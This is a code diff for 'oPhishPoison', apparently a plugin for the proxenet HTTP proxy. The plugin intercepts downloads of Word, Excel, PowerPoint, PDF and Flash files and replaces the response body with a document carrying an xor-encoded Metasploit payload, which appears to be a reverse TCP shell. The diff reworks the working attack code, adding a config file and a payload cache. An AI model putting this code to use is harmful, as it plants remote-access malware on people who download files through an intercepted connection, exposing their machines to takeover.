@@ -10,20 +10,25 @@ How to use:
 
 TODO:
 - add html poisoning: inject b33f javascript
-- move the settings into the .proxenet.ini config file
 """
 
-__PLUGIN__ = "oPhishPoison"
-__AUTHOR__ = "@_hugsy_"
+PLUGIN_NAME   = "oPhishPoison"
+AUTHOR        = "@_hugsy_"
 
 
-import os, subprocess
+import os, subprocess, ConfigParser
 from pimp import HTTPResponse, HTTPBadResponseException
 
+HOME = os.getenv( "HOME" )
+CONFIG_FILE = os.getenv("HOME") + "/.proxenet.ini"
 
-path_to_msfpayload   = "/home/hugsy/tmp/revshtcp"
-path_to_python       = "/usr/bin/python2.7"
-path_to_xor_payload  = "/home/hugsy/code/xor-payload/xor-payload.py"
+config = ConfigParser.ConfigParser()
+config.read(CONFIG_FILE)
+path_to_msfpayload   = config.get(PLUGIN_NAME, "msfpayload")
+path_to_python       = config.get(PLUGIN_NAME, "python")
+path_to_xor_payload  = config.get(PLUGIN_NAME, "xor_payload")
+
+file_cache = {}
 
 types = {"docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
          "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
@@ -46,35 +51,49 @@ def is_supported_type(t):
     return None
 
 
+def hit_cache(ctype):
+    """
+    Tried to get the right file from the cache.
+    """
+    res = file_cache.get(ctype, None)
+    if res is None:
+        return False
+
+    if not os.access(res, os.R_OK):
+        return False
+
+    return res
+
+
 def replace_with_malicious(http, ctype):
     """
     1. generate on-the-fly the right payload
-    2. replace the HTTP body
+    2. replace the HTTP response body
     3. profit
     """
 
     # 1.
     cmd = "{python} {xor} --quiet".format(python=path_to_python, xor=path_to_xor_payload)
-    if ctype in ("xslx", "xls"):    cmd += "--excel"
+    if   ctype in ("xslx", "xls"):  cmd += "--excel"
     elif ctype in ("docx", "doc"):  cmd += "--word"
     elif ctype in ("pptx", "ppt"):  cmd += "--powerpoint"
     elif ctype == "pdf":            cmd += "--pdf"
     elif ctype == "swf":            cmd += "--flash"
 
-    try:
-        f = open(path_to_msfpayload, "rb")
-        p = subprocess.Popen(cmd.split(" "), stdin=f)
-        res = p.communicate()[0]
-        f.close()
-    except Exception as e:
-        print("Payload generation failed: %s" % e)
-        return False
+    res = hit_cache(ctype)
+    if res == False:
+        try:
+            with open(path_to_msfpayload, "rb") as f:
+                p = subprocess.Popen(cmd.split(" "), stdin=f)
+                res = p.communicate()[0]
+            file_cache[ctype] = res
+        except Exception as e:
+            print("Payload generation failed: %s" % e)
+            return False
 
-    #2.
+    # 2.
     with open(res, "rb") as f:
         http.body = f.read()
-
-    os.unlink(res)
 
     # 3.
     return True
@@ -82,7 +101,7 @@ def replace_with_malicious(http, ctype):
 
 def proxenet_request_hook(rid, request, uri):
     """
-    proxenet_request_hook() is not useful
+    proxenet_request_hook() is not useful now, maybe later.
     """
     return request
 
